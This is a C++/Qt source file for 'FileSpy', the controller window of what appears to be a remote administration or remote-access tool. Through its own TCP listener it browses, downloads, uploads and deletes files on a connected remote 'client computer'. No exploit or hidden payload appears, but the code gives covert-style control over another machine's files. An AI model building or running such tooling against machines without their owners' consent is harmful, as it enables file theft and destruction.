#include "filespy.h"

FileSpy::FileSpy(QWidget *parent) : QWidget(parent), mSock(0)
{
    // 初始化路径
    _curClientDir.setPath("");
    _curServerDir.setPath(QDir::currentPath());

    // 初始化窗口
    const int w = 500, h = 600;
    const int x = (QApplication::desktop()->width() - w) >> 1;
    const int y = (QApplication::desktop()->height() - h) >> 1;
    this->setGeometry(x, y, w, h);
    this->setMinimumSize(w, h);
    this->setMaximumSize(w, h);

    // 设置提示
    QLabel *lbClient = new QLabel("客户端电脑:", this);
    lbClient->setGeometry(10,10,100,20);
    QLabel *lbServer = new QLabel("我的电脑:", this);
    lbServer->setGeometry(10,300,100,30);

    // 设置文件列表
    mClientFileList = new QListWidget(this);
    mClientFileList->setGeometry(10,30,480,260);
    mClientFileList->setSelectionMode(QListWidget::SelectionMode::ExtendedSelection);
    connect(mClientFileList, SIGNAL(itemDoubleClicked(QListWidgetItem*)), this, SLOT(loadClientDir(QListWidgetItem *)));

    mServerFileList = new QListWidget(this);
    mServerFileList->setGeometry(10,330,480,260);
    mServerFileList->setSelectionMode(QListWidget::SelectionMode::ExtendedSelection);
    connect(mServerFileList, SIGNAL(itemDoubleClicked(QListWidgetItem*)), this, SLOT(loadServerDir(QListWidgetItem *)));

    // 客户端列表的操作菜单
    mClientMenu = new QMenu(this);
    QAction *actClientRefresh = mClientMenu->addAction("刷新");
    connect(actClientRefresh,SIGNAL(triggered(bool)), this, SLOT(refreshClientList()));
    QAction *actDownload = mClientMenu->addAction("下载（只能对文件进行操作）");
    connect(actDownload,SIGNAL(triggered(bool)), this,SLOT(downloadFile()));
    QAction *actDelete = mClientMenu->addAction("删除（只能对文件进行操作）");
    connect(actDelete, SIGNAL(triggered(bool)), this, SLOT(deleteFile()));

    // 在列表中增加鼠标事件监控，当右击点下时就能弹出菜单
    mClientFileList->installEventFilter(this);

    // 本机列表的操作菜单
    mServerMenu = new QMenu(this);
    QAction *actServerRefresh = mServerMenu->addAction("刷新");
    connect(actServerRefresh,SIGNAL(triggered(bool)), this, SLOT(refreshServerList()));
    QAction *actUpload= mServerMenu->addAction("上传（只能对文件进行操作）");
    connect(actUpload,SIGNAL(triggered(bool)), this,SLOT(uploadFile()));

    // 在列表中增加鼠标事件监控，当右击点下时就能弹出菜单
    mServerFileList->installEventFilter(this);
}

int FileSpy::startFileSpyServer(QString userName)
{
    // 设置窗口标题
    _userName = userName;
    this->setWindowTitle(userName.append("-文件监控"));

    // 开启新的服务端
    mServer = new TcpServer(this);
    connect(mServer,SIGNAL(newConnection(QTcpSocket*)), this,SLOT(newConnection(QTcpSocket*)));

    mServer->start(0);
    if (!mServer->server()->isListening()) {
        qDebug() << "开启文件监控服务端失败";
        deleteLater();
        return -1;
    }

    // 开启监控窗口
    this->show();

    return mServer->server()->serverPort();
}

void FileSpy::addFilesToList(QListWidget *list, QList<QByteArray> strList, QFileIconProvider::IconType iconType, QString type)
{
    foreach (QByteArray bs, strList) {
         QString s = QString::fromLocal8Bit(bs);
        if (s.size() > 0) {
            QListWidgetItem *item = new QListWidgetItem(list);

            // 设置头像
            item->setIcon(QFileIconProvider().icon(iconType));

            // 设置类型
            item->setWhatsThis(type);

            // 增加文件到列表
            item->setText(s);
            list->addItem(item);
        }
    }
}

QStringList FileSpy::getCurrentFile(QListWidget *list)
{
    QStringList files;
    if (list->currentRow() >= 0) {
        QList<QListWidgetItem *> items = list->selectedItems();
        foreach(QListWidgetItem *it, items) {
            // 只获取文件
            if( it->whatsThis() == FileTypeFile ) {
                files.append(it->text());
            }
        }
    }
    return files;
}

QList<QByteArray> FileSpy::getLocalDrives()
{
    // 获取本机盘符
    QFileInfoList fileList = QDir::drives();
    QList<QByteArray> baList;
    foreach(QFileInfo info , fileList) {
        baList.append(info.filePath().toLocal8Bit());
    }
    return baList;
}

QList<QByteArray> FileSpy::getLocalDirs(QDir dir)
{
    // 获取目录下的所有目录
    QList<QByteArray> baList;
    QList<QString> strList = dir.entryList(QDir::Dirs);
    foreach(QString s, strList) {
        if (s!="." && s!="..") {
            baList.append(s.toLocal8Bit());
        }
    }
    return baList;
}

QList<QByteArray> FileSpy::getLocalFiles(QDir dir)
{
    // 获取本机目录下的文件
    QList<QByteArray> baList;
    QList<QString> strList = dir.entryList(QDir::Files);
    foreach(QString s, strList) {
        baList.append(s.toLocal8Bit());
    }
    return baList;
}

void FileSpy::processCommand(QByteArray &cmd, QByteArray &args)
{
    cmd = cmd.toUpper().trimmed();
    QHash<QByteArray, QByteArray> hashArgs = parseArgs(args);

    // 获取所有盘符
    if (cmd == CmdSendDrives) {
        doSendDrives(hashArgs);
        return;
    }

    // 获取客户端目录下的所有目录
    if (cmd == CmdSendDirs) {
        doSendDirs(hashArgs);
        return;
    }

    // 获取客户端目录下的所有文件
    if (cmd == CmdSendFiles) {
        doSendFiles(hashArgs);
        return;
    }

    // 删除文件成功
    if (cmd == CmdDeleteFileSuccess) {
        //QMessageBox::information(this, "提示","删除文件成功");
        return;
    }

    // 删除文件失败
    if (cmd == CmdDeleteFileFailed) {
        QMessageBox::warning(this, "提示","删除文件失败");
        return;
    }
}

QHash<QByteArray, QByteArray> FileSpy::parseArgs(QByteArray &args)
{
    QList<QByteArray> listArgs = args.split(CmdSplit[0]);

    // 分解参数，然后把它加入哈希表
    QHash<QByteArray, QByteArray> hashArgs;
    for(int i=0; i<listArgs.length()-1 ; i+=2) {
        hashArgs.insert(listArgs[i].toUpper().trimmed(),
                        listArgs[i+1].trimmed());
    }

    return hashArgs;
}

void FileSpy::doSendDrives(QHash<QByteArray, QByteArray> &args)
{
    // 重设路径
    _curClientDir.setPath("");

    // 清空列表
    mClientFileList->clear();

    // 打印到列表上
    QList<QByteArray> strList = args["DRIVES"].split(CmdFileSplit[0]);
    addFilesToList(mClientFileList, strList, QFileIconProvider::Drive, FileTypeDrive);
}

void FileSpy::doSendDirs(QHash<QByteArray, QByteArray> &args)
{
    // 重设路径
    _curClientDir.setPath(QString::fromLocal8Bit(args["DIR"]));

    // 清空列表
    mClientFileList->clear();

    // 打印到列表上
    QList<QByteArray> strList = args["DIRS"].split(CmdFileSplit[0]);

    // 返回上一页名字
    strList.push_front(_dirBack);

    addFilesToList(mClientFileList, strList, QFileIconProvider::Folder, FileTypeDir);
}

void FileSpy::doSendFiles(QHash<QByteArray, QByteArray> &args)
{
    // 打印到列表上
    QList<QByteArray> strList = args["FILES"].split(CmdFileSplit[0]);
    addFilesToList(mClientFileList, strList, QFileIconProvider::File, FileTypeFile);
}

void FileSpy::loadClientDir(QListWidgetItem *item)
{
    // 双击后加载新文件夹
    if (item->whatsThis() == FileTypeDir || item->whatsThis() == FileTypeDrive) {
        QDir dir;
        if (item->text() == "..") {
            if (_curClientDir.absolutePath().right(2) == ":/") {
                dir = "";
            } else {
                dir = QDir(_curClientDir.absolutePath().left(_curClientDir.absolutePath().lastIndexOf('/')+1));
            }
        } else {
            if (_curClientDir.absolutePath().indexOf("/") == -1) {
                dir = QDir(_curClientDir.absolutePath()+item->text());
            } else {
                dir = QDir(_curClientDir.absolutePath()+"/"+item->text());
            }
        }
        qDebug() << dir;
        refreshClientList(dir);
    }
}

void FileSpy::refreshClientList()
{
    if (mSock) {
        // 获取当前路径下的所有文件
        QString data;
        data.append(CmdGetDirFiles+CmdSplit);
        data.append("DIR"+CmdSplit+_curClientDir.absolutePath());
        data.append(CmdEnd);
        mSock->write(data.toLocal8Bit());
    }
}

void FileSpy::refreshClientList(QDir dir)
{
    if (mSock) {
        // 获取当前路径下的所有文件
        QString data;
        data.append(CmdGetDirFiles+CmdSplit);
        data.append("DIR"+CmdSplit+dir.absolutePath());
        data.append(CmdEnd);
        mSock->write(data.toLocal8Bit());
    }
}

void FileSpy::downloadFile()
{
    QStringList files = getCurrentFile(mClientFileList);
    if (mSock) {
        foreach(QString fileName, files) {
            // 开始接收文件
            QDir serverDir = _curServerDir.absoluteFilePath(fileName);
            QDir clientDir = _curClientDir.absoluteFilePath(fileName);
            FileTransfer *ft = new FileTransfer();
            int port = ft->startRecvFileServer(_userName,serverDir.path());

            if (port != -1) {
                // 发送下载命令
                QString data;
                data.append(CmdDownloadFile+CmdSplit);
                data.append("FILE_PATH"+CmdSplit+clientDir.path()+CmdSplit);
                data.append("PORT"+CmdSplit+QString::number(port));
                data.append(CmdEnd);
                mSock->write(data.toLocal8Bit());
            }
        }
    }
}

void FileSpy::deleteFile()
{
    if (mSock) {
        // 删除当前文件
        QStringList files = getCurrentFile(mClientFileList);
        if (files.length() > 0) {
            foreach(QString file, files) {
                QString path = _curClientDir.absoluteFilePath(file);

                // 发送数据
                QString data;
                data.append(CmdDeleteFile+CmdSplit);
                data.append("FILE_PATH"+CmdSplit+path);
                data.append(CmdEnd);
                mSock->write(data.toLocal8Bit());

                // 刷新列表
                refreshClientList();
            }
        }
    }
}

void FileSpy::loadServerDir(QListWidgetItem *item)
{
    // 双击后加载新文件夹
    if (item->whatsThis() == FileTypeDrive || item->whatsThis() == FileTypeDir) {
        QDir dir = _curServerDir;
        dir.cd(item->text());

        if (dir == _curServerDir) {
            dir.setPath("");
        }
        _curServerDir = dir;

        loadServerDir(dir);
    }
}

void FileSpy::loadServerDir(QDir dir)
{
    if (dir.path() == "") {
        // 获取盘符
        QList<QByteArray> driveList = getLocalDrives();

        // 清空列表
        mServerFileList->clear();

        addFilesToList(mServerFileList, driveList, QFileIconProvider::Drive, FileTypeDrive);
    } else {
        // 获取路径
        QList<QByteArray> dirList = getLocalDirs(dir);

        // 获取文件
        QList<QByteArray> fileList = getLocalFiles(dir);

        // 清空列表
        mServerFileList->clear();

        dirList.push_front(_dirBack);
        addFilesToList(mServerFileList, dirList, QFileIconProvider::Folder, FileTypeDir);
        addFilesToList(mServerFileList, fileList, QFileIconProvider::File, FileTypeFile);
    }
}

void FileSpy::refreshServerList()
{
    loadServerDir(_curServerDir);
}

void FileSpy::uploadFile()
{
    QStringList files = getCurrentFile(mServerFileList);
    if (mSock && files.length() > 0) {
        foreach(QString fileName, files) {
            // 开始接收文件
            QDir serverDir = _curServerDir.absoluteFilePath(fileName);
            QDir clientDir = _curClientDir.absoluteFilePath(fileName);
            FileTransfer *ft = new FileTransfer();
            int port = ft->startSendFileServer(_userName,serverDir.path());

            if (port != -1) {
                // 发送下载命令
                QString data;
                data.append(CmdUploadFile+CmdSplit);
                data.append("FILE_PATH"+CmdSplit+clientDir.path()+CmdSplit);
                data.append("PORT"+CmdSplit+QString::number(port));
                data.append(CmdEnd);
                mSock->write(data.toLocal8Bit());
            }
        }
    }
}

void FileSpy::newConnection(QTcpSocket *s)
{
    // 新增客户
    mSock = new TcpSocket(s, this);
    connect(mSock,SIGNAL(newData()), this, SLOT(processBuffer()));
    connect(mSock, SIGNAL(disconnected()), this, SLOT(deleteLater()));

    // 获取客户端盘符
    refreshClientList();

    // 获取本机当前目录
    refreshServerList();

    // 不再监听新客户
    mServer->server()->close();
}

void FileSpy::processBuffer()
{
    // 从socket里获取缓存区
    QByteArray *buf = mSock->buffer();

    int endIndex;
    while ((endIndex = buf->indexOf(CmdEnd)) > -1) {
        // 提取一行指令
        QByteArray data = buf->mid(0, endIndex);
        buf->remove(0, endIndex + CmdEnd.length());

        // 提取指令和参数
        QByteArray cmd, args;
        int argIndex = data.indexOf(CmdSplit);
        if (argIndex == -1) {
            cmd = data;
        } else {
            cmd = data.mid(0, argIndex);
            args = data.mid(argIndex+CmdSplit.length(), data.length());
        }

        // 处理指令
        processCommand(cmd, args);
    }
}

bool FileSpy::eventFilter(QObject *watched, QEvent *event)
{
    // 右键弹出菜单
    if (watched == (QObject*)mClientFileList) {
        if (event->type() == QEvent::ContextMenu) {
            mClientMenu->exec(QCursor::pos());
        }
    } else if (watched==(QObject*)mServerFileList) {
        if (event->type() == QEvent::ContextMenu) {
            mServerMenu->exec(QCursor::pos());
        }
    }

    return QObject::eventFilter(watched, event);
}

void FileSpy::closeEvent(QCloseEvent *)
{
    // 删除窗口
    deleteLater();
}
